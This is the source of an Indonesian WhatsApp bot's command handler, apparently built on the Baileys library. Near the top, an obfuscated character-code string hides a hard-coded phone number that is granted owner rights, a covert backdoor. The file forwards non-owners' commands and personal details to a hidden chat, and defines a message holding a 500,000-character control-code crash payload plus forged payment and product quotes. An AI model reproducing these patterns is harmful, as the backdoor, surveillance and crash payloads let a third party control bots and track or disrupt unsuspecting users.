/*
  #- Credits By Hikaa
*/
process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const absenData = {}
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const cron = require('node-cron');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require("@distube/ytdl-core");
const ffmpeg = require("fluent-ffmpeg");

const speed = require('performance-now');
const moment = require("moment-timezone");

const nou = require("node-os-utils");
const cheerio = require('cheerio');
const didyoumean = require('didyoumean');
const photooxy = require('./sistem-asuma/photooxy');
const toMs = require('ms')
const Selxyzz = require('selxyz-assistant');
const similarity = require('similarity')
const threshold = 0.72 
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const { randomBytes } = require('crypto');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { antispam } = require('./sistem-asuma/antispam');
//const { remini } = require('./sistem-asuma/remini');
const { 
lyrics, 
lyricsv2, 
wallpaper, 
wallpaperv2, 
googleImage, 

bucin, 
mediafiredl, 
jadwalsholat 
} = require('@bochilteam/scraper')
const { exec, spawn, execSync } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, InteractiveMessage, generateMessageIDV2 } = require('@whiskeysockets/baileys');
const Harinih = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
const { 
	CatBox, 
	fileIO, 
	pomfCDN 
} = require('./sistem-asuma/uploader');
const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl, spotifyDl } = require('./library/scraper');
//const { CatBox, pomfCDN, CDNmeitang, TelegraPh, UploadFileUgu, webp2mp4File } = require('./sistem-asuma/uploader');
const { mediafiree } = require('./sistem-asuma/mediafire');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');


module.exports = Ditss = async (Ditss, m, chatUpdate, store) => {
	try {
await LoadDataBase(Ditss, m)
const botNumber = await Ditss.decodeJid(Ditss.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
//const prefix = "."
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : global.prefix
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const makeid = randomBytes(3).toString('hex')
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		m.device = /^3A/.test(m.id) ? 'ios' : m.id.startsWith('3EB') ? 'web' : /^.{21}/.test(m.id) ? 'android' : /^.{18}/.test(m.id) ? 'desktop' : 'unknown';
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const command = isPremium ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
//const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const full_args = body.replace(command, '').slice(1).trim()
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const from = m.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')
const tag = `@${m.sender.split('@')[0]}`
const taggc = `@${from.split('@')[0]}`
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const sender = m.key.fromMe ? (Ditss.user.id.split(':')[0]+'@s.whatsapp.net' || Ditss.user.id) : (m.key.participant || m.key.remoteJid)
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
// FUNCTION WAKTU
let d = new Date
let gmt = new Date(0).getTime() - new Date('1 Januari 2023').getTime()
const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString('id', { weekday: 'long' })
const calender = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timestampp = speed();
const latensi = speed() - timestampp
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)
const isBanned = db.users[sender] !== undefined ? db.users[sender].banned : false
const userId = m.sender
const isGroup = m.key.remoteJid.endsWith('@g.us')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
// GROUP METADATA
const groupMetadata = m.isGroup ? await Ditss.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const groups = global.db.groups[m.chat] !== undefined ? global.db.groups[m.chat] : false;
 
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const fsaluran = { key : {
remoteJid: `${nomore}@s.whatsapp.net`,
participant : `${nomore}@s.whatsapp.net`
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363391204793452@newsletter@newsletter',
    newsletterName: '',
    caption: body
}}}
// FUNCTION SALDO & DATA
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./sistem-asuma/deposit")
let db_saldo = JSON.parse(fs.readFileSync("./library/database/saldo.json"));
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
const ditsganteng = addSaldo(m.sender, 1, db_saldo)
// BATAS SALDO
//const isAntiLinkCh = m.isGroup ? db.chats[m.chat].antilinkch : false;
//const linkRegex = /https?:\/\/(whatsapp\.com\/channel\/[A-Za-z0-9]+)/; 
// PP USERR 
const isSticker = (m.type == 'stickerMessage')
var ppuser
try {
ppuser = await Ditss.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
// FUNCTION Onlygc
//if (!isCreator && global.onlygc && !m.isGroup && isCmd && !['chat', 'menu', 'upch', 'play', 'ai', 'owner', 'allmenu', 'menfes', 'confes', 'confess','menfess','tourl','ytmp3'].includes(command)) return m.reply(`bot sedang mode group🤐`)
        if (!isCreator && global.onlygc && !m.isGroup && isCmd && !['chat', 'menu'].includes(command)) return
// FUNCTION SELF & BATAS COMMAND
//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

  if (m.message && m.isGroup) {
      console.log(`\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n`)
     console.log(chalk.magenta(`Group Chat:`))
         console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.white(chalk.bgMagenta(new Date)), chalk.black(chalk.bgWhite(budy || m.mtype)) + '\n' + chalk.white('=> From'), chalk.blue(pushname), chalk.magenta(m.sender) + '\n' + chalk.blue('=> In'), chalk.magenta(groupName, m.chat))
        } else {
            console.log(`\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n`)
			console.log(chalk.magenta(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.white(chalk.bgMagenta(new Date)), chalk.black(chalk.bgWhite(budy || m.mtype)) + '\n' + chalk.white('=> From'), chalk.red(pushname), chalk.magenta(m.sender))
        }
//========= [ FAKEQUOTED ] =========
    const replyAi = async (text) => {
        try {
       //    userSession.limit -= 1;
            const theArray = [
                {
                    attrs: { biz_bot: '1' },
                    tag: "bot"
                },
                {
                    attrs: {},
                    tag: "biz"
                }
            ];
            const gen = {
                conversation: text,
                messageContextInfo: {
                    messageSecret: randomBytes(32),
supportPayload: JSON.stringify({
                        version: 1,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: "1669945700536053",
                    }),
                },
            };

            Ditss.relayMessage(m.chat, gen, {
                messageId: generateMessageIDV2(`${nomore}@s.whatsapp.net`),
                additionalNodes: theArray
            });
        } catch (error) {
            console.error("Error saat membalas:", error);
        }
    };
// REPLY WITH TROLI
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: ppuser, surface: 200, message: 'asuma bot', orderTitle: 'By Ditss', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
// REPLY WITH DOCUMENT
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'asuma',jpegThumbnail: ppuser}}}
//REPLY WITH VN
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
// REPLY API

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
const qkontak = {
key: {
participant: `${nomore}@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=31629821394:+31 6 29821394\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qtext = {key: {remoteJid: "status@broadcast", participant: "31629821394@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "31629821394@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '31629821394@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '31629821394@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '31629821394@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '31629821394@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '31629821394@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `31629821394@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `31629821394@s.whatsapp.net`}}}

const qlive = {key: {participant: '31629821394@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
    const replyAii = async (text) => {
        try {
    //  userSession.limit -= 1;
            const theArray = [
                {
                    attrs: { biz_bot: '1' },
                    tag: "bot"
                },
                {
                    attrs: {},
                    tag: "biz"
                }
            ];
            const gen = {
                conversation: text,
                messageContextInfo: {
                    messageSecret: randomBytes(2),
supportPayload: JSON.stringify({
                        version: 1,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: "1669945700536053",
                    }),
                },
            };

            Ditss.relayMessage(m.chat, gen, {
                messageId: generateMessageIDV2(Ditss.user.id),
                additionalNodes: theArray
            });
        } catch (error) {
            console.error("Error saat membalas:", error);
        }
    };
    //btas
     async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }
 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return 
console.log("!")
}
}
const totalfitur = await totalfiturr()
//good
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await Ditss.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
        //pp
const reply = async (teks) => {
return Ditss.sendMessage(m.chat, {document: fs.readFileSync("./package.json"), mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", caption: `${teks}`,     fileName: `${botname}`,
    fileLength: 99999999999999,
    pageCount: "100",


    contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: {
bussinessName: 'memek',
businessOwnerJid: `${owner}@s.whatsapp.net` }, forwardedNewsletterMessageInfo: { newsletterName: `${botname2}`, newsletterJid: `0@newsletter`}, 
}}, {quoted: qkontak})
}
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
//ai private 
//=== Game Database ==//
if (isCmd && !isCreator){
Ditss.sendMessage(`${global.DataPc}`,{ text: `WhatsApp ${m.isGroup ? `group\n${groupMetadata.subject}` : !m.isGroup ? 'chatt' : 'gatau'}\nFrom : @${m.sender.split('@')[0]}\nChat : ${prefix+command} ${text}`,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `asuma md`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id)  },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 showAdAttribution: true, 
 title: `name: ${pushname}\nnomor: ${nomore}`,
 body: `device: ${m.device}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
}
//let tebaklagu = db.game.tebaklagu = []
const onlyGroup = async() => {
let joinbang = `Hallo ${ki}${pushname}${ka}, untuk menggunakan semua fitur *asuma*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar\n\nAtau anda bisa membeli akses sewa & premium dari owner\njoin group kami: https://chat.whatsapp.com/FVlNkXGLLvXE9fkdgxviIK`
reply(joinbang)}

Ditss.sendKontol = async(chat, judul, teks, button, quot) => {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: footer
}),
header: proto.Message.InteractiveMessage.Header.create({
title: judul,
subtitle: namaOwner,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: button,
}),
contextInfo: {
mentionedJid: [sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: idSaluran,
newsletterName: botname,
serverMessageId: 143
}
}
})
}
}
}, {quoted: quot})

await Ditss.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}

Ditss.enhancer = Ditss.enhancer ? Ditss.enhancer : {};
        
Ditss.autoshalat = Ditss.autoshalat ? Ditss.autoshalat : {}
    let id = m.chat
    if (id in Ditss.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        Ditss.autoshalat[id] = [
            Ditss.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./source/media/dits-pler.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete Ditss.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }
		async function emote(emo) {
			Ditss.sendMessage(m.chat, {
				react: {
					text: emo,
					key: m.key
				}
			});
		}
        global.db.menfess = global.db.menfess ? global.db.menfess : {}
         let mf = Object.values(global.db.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Balas Pesan Menfess Mu Di Private Chat`)
          //  if (!/conversation|extended/.test(m.mtype)) return reply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await Ditss.sendMessage(mf.from, { text: text }).then(async () => {
               m.reply(`pesan Berhasil Terkirim!!`)
               await sleep(1000)
               delete global.db.menfess[mf.id]
               return !0
            })
         }     
  Ditss.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Ditss.sendPresenceUpdate('composing', jid)
      return Ditss.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

//kontal
const userdb = global.db.users[m.sender]
const users = global.db.users

const listall = global.db.listall

const chats = global.db.chats
// FUNCTION ONLY PRIVATE CHAT
        if (global.onlypc) {
        	if (isCmd && m.isGroup && !isCreator && !isPremium){
	         return 
	     }
	}
//pler
		if (!isCreator && !m.key.fromMe && m.message) {
			if (budy.match(`@${global.owner}`)) {
await Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/lusiapa.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
			}
		};
if (command) {
const code = fs.readFileSync("./case.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}

// Fungsi untuk mendeteksi kesalahan input perintah
const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
let mean = didyoumean(command, help);
let sim = similarity(command, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && command.toLowerCase() !== mean.toLowerCase()) {

// Pesan untuk orang yang salah menginput perintah
let respon = `
Hmm... sepertinya perintah yang anda masukkan tidak dikenali.
Apakah anda mencari perintah berikut ini? 🤔
`.trim();

let button = [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"${prefix + mean} (${similarityPercentage}%)\",\"id\":\"${prefix + mean}\"}`
}
]

// Fungsi untuk mengirim pesan dan tombol
//Ditss.sendKontol(m.chat, "", respon, button, m)
}
}
}
// FUNCTION ANTI SPAM BY DITSS
if (global.antispam && !isCreator && command && !isPremium) {
if (antispam.isFiltered(m.sender)) {
//m.reply(`jangan spam dong`)
//await Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/spam.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
await m.reply("jangan spam dong kakk🥺👉👈")
await Ditss.sendMessage(m.chat, {react: {text: '😡', key: m.key}})
return;
} else if (command) {
antispam.addFilter(m.sender)
}
}
//============= [ EVENT GROUP ] ===============================================
const isNumber = x => typeof x === 'number' && !isNaN(x)
try {
let user = db.users[sender]
if (user) {
if (typeof user !== 'object') db.users[sender] = {}
if (!('jid' in user)) user.jid = sender
if (!('name' in user)) user.name = pushname
if (!('date' in user)) user.date = calender
if (!isNumber(user.limit)) user.limit = 100
if (!('hitcmd' in user)) user.hitcmd = 0
if (!isNumber(user.balance)) user.balance = 10000
if (!('banned' in user)) user.banned = false
if (!('premium' in user)) user.premium = false
if (!isNumber(user.expired)) user.expired = Date.now() + toMs('7d')
} else db.users[sender] = {
jid: sender,
name: pushname,
date: calender,
limit: 100,
hitcmd: 0,
balance: 10000,
banned: false,
premium: false,
expired: Date.now() + toMs('7d')
}
} catch (err) {
console.error(err)
}
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilinkch == true && !isCreator) return
        
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd && !isSticker) {
try {
   let response = await fetch('https://api.simsimi.vn/v2/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
        m.reply("" + json.message);
} catch (e) {}
}        
//pler
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Ditss.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Ditss.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Ditss.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Ditss.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Ditss.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Ditss.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Ditss.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Ditss.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}
        

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`${tag} sedang *Afk* ${reason ? 'karena ' + reason : 'tanpa alasan'} selama *${clockString(new Date - afkTime)}*
`.trim())
}
if (global.db.users[sender].afkTime > -1) {
let user = global.db.users[sender]
m.reply(`${tag} telah kembali dari *Afk* ${user.afkReason ? 'setelah ' + user.afkReason : ''}\nselama *${clockString(new Date - user.afkTime)}*`.trim())
user.afkTime = -1
user.afkReason = ''
}
if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
